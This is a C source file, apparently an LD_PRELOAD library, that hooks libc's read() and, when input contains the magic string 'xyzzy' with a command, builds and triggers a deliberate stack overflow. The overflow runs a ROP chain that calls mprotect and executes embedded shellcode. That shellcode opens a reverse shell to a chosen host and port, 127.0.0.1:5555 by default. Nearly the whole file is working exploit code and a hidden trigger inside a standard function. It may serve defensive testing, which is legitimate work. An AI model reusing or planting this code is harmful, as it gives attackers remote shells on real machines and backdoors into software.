#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netdb.h>
#include <assert.h>
#include <dlfcn.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "base64.h"
#include "strnstr.h"

typedef void *Pointer;

typedef struct Offset {
	long	r : 48;
	char	b : 8;
	char	f : 8;
} Offset, *OffsetPtr;

typedef union AddressUnion {
	Pointer	p;
	Offset	o;
	char	c[8];
} AddressUnion, *AddressUnionPtr;

typedef struct BaseAddresses {
	Pointer buffer_base;
	Pointer libc_base;
	Pointer pie_base;
	Pointer stack_base;
} BaseAddresses, *BaseAddressesPtr;

typedef struct ShellCode {
	unsigned char	prolog[18];
	unsigned short	port;
	struct in_addr	ipAddress;
	unsigned char	epilog[50];
	unsigned short	unused;
} ShellCode, *ShellCodePtr;

typedef union ShellCodeUnion {
	unsigned char	raw[76];
	ShellCode	sc; 
} ShellCodeUnion, *ShellCodeUnionPtr;

typedef struct Payload {
	char		pl_dst[8];
	AddressUnion	pl_canary;
	AddressUnion	pl_rbp;
	AddressUnion	pl_popRDI;
	AddressUnion	pl_stackPage;
	AddressUnion	pl_popRSI;
	ptrdiff_t	pl_stackSize;
	AddressUnion	pl_popRDX;
	long		pl_permission;
	AddressUnion	pl_mprotect;
	AddressUnion	pl_shellCode;
	ShellCodeUnion	pl_scu;
} Payload, *PayloadPtr;

static const char s_elf_signature[] = {0x7F, 'E', 'L', 'F', 0};

static const char s_magic[]	= "xyzzy";

static const char s_makeload[]	= "MAKELOAD";
static const char s_dumpload[]	= "DUMPLOAD";
static const char s_testload[]	= "TESTLOAD";
static const char s_overflow[]	= "OVERFLOW";

static const char s_libc_popRDI[]   = {0x5f, 0xc3, 0};
static const char s_libc_popRSI[]   = {0x5e, 0xc3, 0};
static const char s_libc_popRDX[]   = {0x5a, 0xc3, 0};
static const char s_libc_mprotect[] = "mprotect";
static const char s_libc_read[]     = "read";

static Payload payload = {
	.pl_scu = {
		.raw = {
			0x6a, 0x29,					// pushq	$0x29
			0x58,						// pop		%rax
			0x99, 						// cltd
			0x6a, 0x02,					// pushq	$0x2
			0x5f,						// pop		%rdi
			0x6a, 0x01, 					// pushq	$0x1
			0x5e,						// pop		%rsi
			0x0f, 0x05,					// syscall
			0x48, 0x97,					// xchg		%rax,%rdi
			0x48, 0xb9, 0x02, 0x00,				// movabs	$0x100007fb3150002,%rcx
			0x15, 0xb3,					// .WORD	htons(5555)
			0x7f, 0x00, 0x00, 0x01,				// .DWORD	127.0.0.1
			0x51,						// push		%rcx
			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
			0x6a, 0x10,					// pushq	$0x10
			0x5a,						// pop		%rdx
			0x6a, 0x2a,					// pushq	$0x2a
			0x58,						// pop		%rax
			0x0f, 0x05,					// syscall
			0x6a, 0x03,					// pushq	$0x3
			0x5e,						// pop		%rsi
			0x48, 0xff, 0xce,				// dec		%rsi
			0x6a, 0x21,					// pushq	$0x21
			0x58,						// pop		%rax
			0x0f, 0x05,					// syscall
			0x75, 0xf6,					// jne		27<dup2_loop>
			0x6a, 0x3b,					// pushq	$0x3b
			0x58,						// pop		%rax
			0x99,						// cltd
			0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,	// movabs	$0x68732f6e69622f,%rbx
			0x73, 0x68, 0x00,				//
			0x53,						// push		%rbx
			0x48, 0x89, 0xe7,				// mov		%rsp,%rdi
			0x52,						// push		%rdx
			0x57,						// push		%rdi
			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
			0x0f, 0x05					// syscall
		} // .raw
	} // .pl_scu
}; // payload

static _Bool	initialized	= 0;

static Pointer	libc_mprotect	= NULL;
static Pointer	libc_popRDI	= NULL;
static Pointer	libc_popRSI	= NULL;
static Pointer	libc_popRDX	= NULL;

static size_t	libc_size	= 0;

static BaseAddresses	baseAddresses	= {NULL, NULL, NULL, NULL};

static Pointer pageBase(Pointer p) {
	return (Pointer) (((unsigned long) p) & (-1 ^ getpagesize() - 1));
} // pageBase()

static Pointer elfBase(Pointer p) {
	p = pageBase(p);
	while (strncmp(p, s_elf_signature, strlen(s_elf_signature)))
		p -= getpagesize();

	return p;
} // elfBase()

static Pointer stackPage(void) {
	int dummy = 0;

	return pageBase(&dummy);
} // stackPage()

static Pointer findGadget(const Pointer start, const char *gadget, const size_t size) {
	return strnstr(baseAddresses.libc_base, gadget, size);
} // findGadget()

static void initialize(void)
{
	if (!initialized)
	{
		libc_size       = getpagesize() * 100; // Punt

		libc_mprotect	= dlsym(RTLD_NEXT, s_libc_mprotect);

		baseAddresses.libc_base  = elfBase(libc_mprotect);
		baseAddresses.pie_base   = elfBase(initialize);
		baseAddresses.stack_base = stackPage();

		libc_popRDI = findGadget(baseAddresses.libc_base, s_libc_popRDI, libc_size);
		libc_popRSI = findGadget(baseAddresses.libc_base, s_libc_popRSI, libc_size);
		libc_popRDX = findGadget(baseAddresses.libc_base, s_libc_popRDX, libc_size);

		initialized = 1;
	} // if

	return;
} // initialize()

static Pointer baseAddress(char base, BaseAddressesPtr baseAddressesPtr) {
	switch (base) {
		case 'B' : return baseAddressesPtr->buffer_base;
		case 'L' : return baseAddressesPtr->libc_base;
		case 'P' : return baseAddressesPtr->pie_base;
		case 'S' : return baseAddressesPtr->stack_base; // Actually just base of current stack page
		default  : return 0;
	} // switch
} // baseAddress()

Offset pointerToOffset(Pointer p, char base, BaseAddressesPtr baseAddressesPtr) {
	return (Offset) { (p - baseAddress(base, baseAddressesPtr)), base, '~' };
} // pointerToOffset()

Offset indirectToOffset(Pointer p, char base, BaseAddressesPtr baseAddressesPtr) {
	return (Offset) { (p - baseAddress(base, baseAddressesPtr)), base, '*' };
} // indirectToOffset()

Pointer offsetToPointer(Offset o, BaseAddressesPtr baseAddressesPtr) {
	return (Pointer) (o.r + baseAddress(o.b, baseAddressesPtr));
} // offsetToPointer()

Pointer offsetToIndirect(Offset o, BaseAddressesPtr baseAddressesPtr) {
	return *((Pointer *) offsetToPointer(o, baseAddressesPtr));
} // offsetToIndirect()

AddressUnion fixupAddressUnion(AddressUnion au, BaseAddressesPtr baseAddressesPtr) {
	if (au.o.f == '~')
		return (AddressUnion) { .p = offsetToPointer(au.o, baseAddressesPtr) };

	if (au.o.f == '*')
		return (AddressUnion) { .p = offsetToIndirect(au.o, baseAddressesPtr) };

	return au;
} // fixupAddressUnion()

static void makeload(PayloadPtr plp) {
	ptrdiff_t libc_mprotect_offset = libc_mprotect - baseAddresses.libc_base;

	// Offsets are relative to the payload
	baseAddresses.buffer_base = plp;

	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));

	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B', &baseAddresses);
	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B', &baseAddresses);
	plp->pl_popRDI.o	= libc_popRDI?pointerToOffset(libc_popRDI, 'L', &baseAddresses):pointerToOffset(&&l_popRDI, 'P', &baseAddresses);
	plp->pl_stackPage.o	= pointerToOffset(baseAddresses.stack_base, 'S', &baseAddresses);
	plp->pl_popRSI.o	= libc_popRDI?pointerToOffset(libc_popRSI, 'L', &baseAddresses):pointerToOffset(&&l_popRSI, 'P', &baseAddresses);
	plp->pl_stackSize	= getpagesize();
	plp->pl_popRDX.o	= libc_popRDX?pointerToOffset(libc_popRDX, 'L', &baseAddresses):pointerToOffset(&&l_popRDX, 'P', &baseAddresses);
	plp->pl_permission	= 0x7;
	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L', &baseAddresses);

	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B', &baseAddresses);

	plp->pl_scu.sc.port     = htons(5555);
	if (!inet_aton("127.0.0.1", &plp->pl_scu.sc.ipAddress))
		assert(0); // This should ALWAYS work.

	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
	int volatile v = 0;

	if (v) {
l_popRDI:	// Fallback gadget for "POP RDI"
		__asm__ ("pop %rdi");
		__asm__ ("ret");
	} // if

	if (v) {
l_popRSI:	// Fallback gadget for "POP RSI"
		__asm__ ("pop %rsi");
		__asm__ ("ret");
	} // if

	if (v) {
l_popRDX:	 // Fallback gadget for "POP RDX"
		__asm__ ("pop %rdx");
		__asm__ ("ret");
	} // if

	return;
} // makeload()

static void dumpload(PayloadPtr plp) {
	fprintf(stderr, "--------------------------------------------\n");
	fprintf(stderr, "%20s: %p\n",	"pl_canary.p",		plp->pl_canary.p);
	fprintf(stderr, "%20s: %p\n",	"pl_rbp.p",		plp->pl_rbp.p);
	fprintf(stderr, "%20s: %p\n",	"pl_popRDI.p",		plp->pl_popRDI.p);
	fprintf(stderr, "%20s: %p\n",	"pl_stackPage.p",	plp->pl_stackPage.p);
	fprintf(stderr, "%20s: %p\n",	"pl_popRSI.p",		plp->pl_popRSI.p);
	fprintf(stderr, "%20s: %#tx\n",	"pl_stackSize",		plp->pl_stackSize);
	fprintf(stderr, "%20s: %p\n",	"pl_popRDX.p",		plp->pl_popRDX.p);
	fprintf(stderr, "%20s: %#tx\n",	"pl_permission",	plp->pl_permission);
	fprintf(stderr, "%20s: %p\n",	"pl_mprotect.p",	plp->pl_mprotect.p);
	fprintf(stderr, "%20s: %p\n",	"pl_shellCode.p",	plp->pl_shellCode.p);
	fprintf(stderr, "%20s: %d\n",	"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
	fprintf(stderr, "%20s: %s\n",	"pl_scu.sc.ipAddress",	inet_ntoa(plp->pl_scu.sc.ipAddress));
	fprintf(stderr, "--------------------------------------------\n");
} // dumpload()

static void dofixups(Pointer p, size_t n, BaseAddressesPtr baseAddressesPtr) {
	for (AddressUnionPtr aup = (AddressUnionPtr)p; aup < (AddressUnionPtr) (p + n - sizeof(AddressUnionPtr) + 1); aup++)
		*aup = fixupAddressUnion(*aup, baseAddressesPtr);
} // dofixups()

static void overflow(Pointer p, size_t n) {
	char buffer[8] = {0};

	baseAddresses.buffer_base = &buffer;;
	dofixups(p, n, &baseAddresses);

	memcpy(buffer, p, n);
} // overflow()

typedef
ssize_t Read(int fd, void *buf, size_t count);
ssize_t read(int fd, void *buf, size_t count) {
	Read *libc_read = dlsym(RTLD_NEXT, s_libc_read);
	ssize_t result = libc_read(fd, buf, count);

	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);

	if (p) {
		initialize();

		p += strlen(s_magic);
		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
			p += strlen(s_makeload);
			makeload(&payload);
			// Parse the stuff after MAKELOAD into s_host:port
			int nc, ns;
			char s_host[256];
			unsigned short port;

			ns = sscanf(p, "%n%255[^: \n]%n:%hu%n", &nc, s_host, &nc, &port, &nc);
	 		assert(ns >= 0 && ns <= 2);
			
			// Set the port to whatever we got from the sscanf (store it in host endian order)
			payload.pl_scu.sc.port = htons((ns > 1) ? port : 5555);

			// See if the s_host string can be parsed by inet_aton()
			if (inet_aton(s_host, &payload.pl_scu.sc.ipAddress) == 0)
				for (struct hostent *he = gethostbyname(s_host); he; he = NULL)
					for (int i = 0; ((struct in_addr **) he->h_addr_list)[i] != NULL; i++)
 						payload.pl_scu.sc.ipAddress = *((struct in_addr **) he->h_addr_list)[i];

			// Generate the payload that we will "echo" back
			unsigned char sPayload64[4096];
			size_t nPayload64 = b64Encode((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));

			// Make room for the payload (where the request used to be).
			char *src = p + nc;
			char *dst = p + nPayload64 - strlen(s_makeload) + strlen(s_overflow);
			int delta = dst - src;
			memmove(dst, src, delta);

			// Replace s_makeload with s_overflow
			memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
			p += strlen(s_overflow) - strlen(s_makeload);

			// Place the payload in the newly created space
			memcpy(p, sPayload64, nPayload64);

			// Adjust the number of characters read
			result += delta;

			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
			((char *) buf)[result] = 0;
		} // if
		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
			dumpload(&payload);
		else if (!strncmp(s_testload, p, strlen(s_testload)))
			overflow((Pointer)&payload, sizeof(payload));
		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
			unsigned char *s64 = (unsigned char *) (p + strlen(s_overflow));
			size_t n256 = b64Decode(s64, b64Length(s64), (unsigned char *) p, 65535);
			overflow(p, n256);
		} // else if
	} // if

	return result;
} // read()

#ifdef READHOOK_MAIN
int main(int argc, char **argv)
{
	fprintf(stderr, "Running as an executable\n");

	assert(sizeof(short) == 2);
	assert(sizeof(int) == 4);
	assert(sizeof(long) == 8);
	assert(sizeof(void *) == 8);
	assert(sizeof(Pointer) == 8);
	assert(sizeof(ptrdiff_t) == 8);
	assert(sizeof(Offset) == 8);
	assert(sizeof(AddressUnion) == 8);
	assert(sizeof(struct in_addr) == 4);
	assert(sizeof(ShellCodeUnion) == 76);
	assert(getpagesize() == 4096);
	assert((-1^(getpagesize()-1))==0xfffffffffffff000);

	initialize();
	makeload(&payload);
	dumpload(&payload);
	overflow((Pointer)&payload, sizeof(payload));
} // main()
#endif
